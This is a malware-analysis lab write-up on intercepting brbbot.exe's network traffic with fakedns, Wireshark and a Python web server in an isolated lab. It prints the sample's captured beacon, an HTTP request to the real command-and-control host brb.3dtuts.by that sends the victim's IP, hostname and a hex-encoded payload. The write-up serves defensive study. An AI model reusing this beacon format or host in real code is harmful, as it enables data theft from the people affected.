# Ex 1.3: Intercepting brbbot.exe's Network Traffic

- [Ex 1.3: Intercepting brbbot.exe's Network Traffic](#ex-13-intercepting-brbbotexes-network-traffic)
  - [Objectives](#objectives)
  - [Steps](#steps)
  - [1 - Launch & Test fakedns](#1---launch--test-fakedns)
  - [2 - Launch Wireshark on REMnux and re-infect brbbot.exe](#2---launch-wireshark-on-remnux-and-re-infect-brbbotexe)
  - [3 - Examine the log](#3---examine-the-log)
  - [4-6 - Start a web server on REMnux and retest](#4-6---start-a-web-server-on-remnux-and-retest)

---

## Objectives

- Learn the essential steps for examining and redirecting the specimen's network traffic in the malware analysis lab.
- Understand the concept behind molding the lab environment to evoke additional behavioral characteristics.

<br/>

---

## Steps

1. Launch `fakedns` on REMnux and confirm that it is working.
2. Start a new capture in Wireshark on REMnux, and then reinfect Windows REM Workstation with `brbbot.exe`.
3. Terminate `brbbot.exe` and stop capture in Wireshark, and then examine the log.
4. Start the web server on REMnux, activate capture in Wireshark, and then reinfect Windows REM Workstation with `brbbot.exe`.
5. Terminate `brbbot.exe` and stop capture in Wireshark, and then examine the log.
6. Save the encoded payload from the HTTP traffic for later analysis.

<br/>

---

## 1 - Launch & Test fakedns

On **REMnux**, run `fakedns`:

```
fakedns
```

![picture 21](../images/eae38f0bcea3f8dc14f8d90c9bff5958ccb3efe09eaa9ddf05e0d9e2edf2db9e.png)  

<br/>

Then from Windows, use `cmd.exe` and try to query a number of domains:

```
nslookup abc.com
nslookup google.com
nslookup testing.com
```

![picture 22](../images/fbde9d45d17dec1cfc63bf3d9854a04c1f4a5efa6e9b2d4844be52a3a8cfbb6f.png)  

- Note the answers are all the IP address of **REMnux**

- Also see the console on **REMnux**:

![picture 23](../images/bd2c4cef58256bdd2095c8afcb1416a30a91db0c5fd975b4f065a348d830e4fc.png)  

<br/>

---

## 2 - Launch Wireshark on REMnux and re-infect brbbot.exe

Launch **Wireshark** and start capture on **REMnux**. Then re-run `brbbot.exe`. After a while, terminate `brbbot.exe` using **Process Hacker**.

<br/>

---

## 3 - Examine the log

Stop capturing on **Wireshark**. Check the traffic:

![picture 24](../images/3b0e20d78afb1d1c2b3cb4be811fc2da1f72469032a892116b2056456db19f45.png)  

- Note the DNS query now gets the DNS response with the IP address of the **REMnux**

<br/>

![picture 25](../images/d41fbe2d459e40fc2f5fa2fcd44d81a98bfbc12fe39d9657aaa7a3ca8f738a3d.png)  

- After the DNS traffic, an event (no. 3) to tcp/80 is observed.
- However, since there is no `tcp/80` listner on the **REMnux** instance, it response with `RST,ACK`.

<br/>

---

## 4-6 - Start a web server on REMnux and retest

On **REMnux**, start an http server using **Python**:

```
sudo python -m SimpleHTTPServer 80
```

![picture 26](../images/bf97cc9db9fb0989d83173a5b62459fdd40066da4b5b1f187be1598d810ae5ad.png)  

<br/>

Start a new capturing session on **Wireshark** on **REMnux**, and re-run `brbbot.exe` on Windows. Terminate `brbbot.exe` after a while and inspect the traffic on **Wireshark**.

<br/>

![picture 27](../images/4a13dc39b2f7c04c6a9c13702a24f6079337835f609e61605d9089ecdfb7611f.png)  

- There is a request to `/ads.php` with a bunch of parameters

<br/>

Use `Follow TCP stream` to inspect:

![picture 28](../images/533bd519f7c8dc0d7cbba316170f75a19bd54be43ec09280c23cd8559e3dc9eb.png)  

<br/>

![picture 29](../images/72c4c0c012e110365b50ee70636da3f73989cb4b61da4bcf91195fd99e690557.png)  

```
GET /ads.php?i=172.16.252.129&c=DESKTOP-2C3IQHO&p=123f373e600822282f3e366028362828753e233e603828292828753e233e603828292828753e233e602c32353235322f753e233e602c323537343c3435753e233e60283e292d32383e28753e233e6037283a2828753e233e60282d383334282f753e233e603d34352f3f292d3334282f753e233e603d34352f3f292d3334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e603f2c36753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60163e363429227b1834362b293e282832343560282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282b343437282d753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60083e382e29322f22133e3a372f33083e292d32383e753e233e60282d383334282f753e233e60282d383334282f753e233e602d36683f283e292d32383e753e233e600d1c1a2e2f33083e292d32383e753e233e602d362f343437283f753e233e60282d383334282f753e233e60282d383334282f753e233e602d36683f283e292d32383e753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e600c36320b292d081e753e233e60282d383334282f753e233e603f37373334282f753e233e6028323334282f753e233e60282d383334282f753e233e60282d383334282f753e233e602f3a28303334282f2c753e233e60282d383334282f753e233e60282d383334282f753e233e60382f3d363435753e233e60282d383334282f753e233e603f3a281334282f753e233e60282d383334282f753e233e603e232b3734293e29753e233e60282d383334282f753e233e60083e3a29383312353f3e233e29753e233e6036283f2f38753e233e6008333e37371e232b3e29323e35383e1334282f753e233e60083e3a2938330e12753e233e60092e352f32363e192934303e29753e233e60092e352f32363e192934303e29753e233e60282d383334282f753e233e602d362f343437283f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e601a2b2b3732383a2f3234351d293a363e1334282f753e233e600c3235082f34293e751a2b2b753e233e60092e352f32363e192934303e29753e233e600822282f3e36083e2f2f32353c28753e233e60092e352f32363e192934303e29753e233e60282d383334282f753e233e600b2934383e2828133a38303e29753e233e600b293438363435753e233e600b2934383634356d6f753e233e60093e3c2833342f76236d6f761a150812753e233e602f3a28303334282f2c753e233e6035342f3e2b3a3f7070753e233e602b2934383f342f753e233e603f37373334282f753e233e6038363f753e233e603834353334282f753e233e60282d383334282f753e233e603f37373334282f753e233e603f37373334282f753e233e6039293939342f753e233e HTTP/1.1
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
Host: brb.3dtuts.by
Connection: Close
Cache-Control: no-cache

HTTP/1.0 404 File not found
Server: SimpleHTTP/0.6 Python/2.7.6
Date: Mon, 05 Jul 2021 17:42:08 GMT
Content-Type: text/html
Connection: close

<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 404.
<p>Message: File not found.
<p>Error code explanation: 404 = Nothing matches the given URI.
</body>

```

- Requested host: `brb.3dtuts.by`
- The `User-Agent` used by the sample is `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)`, which is the same found in static analysis
- The parameters pattern is the same found in static analysis
  - `i=172.16.252.129`: Represent the infected host IP
  - `c=DESKTOP-2C3IQHO`: Represent the infected hostname
  - `p=123f37...`: Represent a payload - Look like a HEX

<br/>

Note the following HEX and further analyze this later:

```
123f373e600822282f3e366028362828753e233e603828292828753e233e603828292828753e233e602c32353235322f753e233e602c323537343c3435753e233e60283e292d32383e28753e233e6037283a2828753e233e60282d383334282f753e233e603d34352f3f292d3334282f753e233e603d34352f3f292d3334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e603f2c36753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60163e363429227b1834362b293e282832343560282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282b343437282d753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60083e382e29322f22133e3a372f33083e292d32383e753e233e60282d383334282f753e233e60282d383334282f753e233e602d36683f283e292d32383e753e233e600d1c1a2e2f33083e292d32383e753e233e602d362f343437283f753e233e60282d383334282f753e233e60282d383334282f753e233e602d36683f283e292d32383e753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e600c36320b292d081e753e233e60282d383334282f753e233e603f37373334282f753e233e6028323334282f753e233e60282d383334282f753e233e60282d383334282f753e233e602f3a28303334282f2c753e233e60282d383334282f753e233e60282d383334282f753e233e60382f3d363435753e233e60282d383334282f753e233e603f3a281334282f753e233e60282d383334282f753e233e603e232b3734293e29753e233e60282d383334282f753e233e60083e3a29383312353f3e233e29753e233e6036283f2f38753e233e6008333e37371e232b3e29323e35383e1334282f753e233e60083e3a2938330e12753e233e60092e352f32363e192934303e29753e233e60092e352f32363e192934303e29753e233e60282d383334282f753e233e602d362f343437283f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e601a2b2b3732383a2f3234351d293a363e1334282f753e233e600c3235082f34293e751a2b2b753e233e60092e352f32363e192934303e29753e233e600822282f3e36083e2f2f32353c28753e233e60092e352f32363e192934303e29753e233e60282d383334282f753e233e600b2934383e2828133a38303e29753e233e600b293438363435753e233e600b2934383634356d6f753e233e60093e3c2833342f76236d6f761a150812753e233e602f3a28303334282f2c753e233e6035342f3e2b3a3f7070753e233e602b2934383f342f753e233e603f37373334282f753e233e6038363f753e233e603834353334282f753e233e60282d383334282f753e233e603f37373334282f753e233e603f37373334282f753e233e6039293939342f753e233e
```

<br/>

On **REMnux**, save the above code as `encoded.hex`:

```
echo "123f373e600822282f3e366028362828753e233e603828292828753e233e603828292828753e233e602c32353235322f753e233e602c323537343c3435753e233e60283e292d32383e28753e233e6037283a2828753e233e60282d383334282f753e233e603d34352f3f292d3334282f753e233e603d34352f3f292d3334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e603f2c36753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60163e363429227b1834362b293e282832343560282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282b343437282d753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60083e382e29322f22133e3a372f33083e292d32383e753e233e60282d383334282f753e233e60282d383334282f753e233e602d36683f283e292d32383e753e233e600d1c1a2e2f33083e292d32383e753e233e602d362f343437283f753e233e60282d383334282f753e233e60282d383334282f753e233e602d36683f283e292d32383e753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e600c36320b292d081e753e233e60282d383334282f753e233e603f37373334282f753e233e6028323334282f753e233e60282d383334282f753e233e60282d383334282f753e233e602f3a28303334282f2c753e233e60282d383334282f753e233e60282d383334282f753e233e60382f3d363435753e233e60282d383334282f753e233e603f3a281334282f753e233e60282d383334282f753e233e603e232b3734293e29753e233e60282d383334282f753e233e60083e3a29383312353f3e233e29753e233e6036283f2f38753e233e6008333e37371e232b3e29323e35383e1334282f753e233e60083e3a2938330e12753e233e60092e352f32363e192934303e29753e233e60092e352f32363e192934303e29753e233e60282d383334282f753e233e602d362f343437283f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e601a2b2b3732383a2f3234351d293a363e1334282f753e233e600c3235082f34293e751a2b2b753e233e60092e352f32363e192934303e29753e233e600822282f3e36083e2f2f32353c28753e233e60092e352f32363e192934303e29753e233e60282d383334282f753e233e600b2934383e2828133a38303e29753e233e600b293438363435753e233e600b2934383634356d6f753e233e60093e3c2833342f76236d6f761a150812753e233e602f3a28303334282f2c753e233e6035342f3e2b3a3f7070753e233e602b2934383f342f753e233e603f37373334282f753e233e6038363f753e233e603834353334282f753e233e60282d383334282f753e233e603f37373334282f753e233e603f37373334282f753e233e6039293939342f753e233e" >> encoded.hex
```

<br/>

---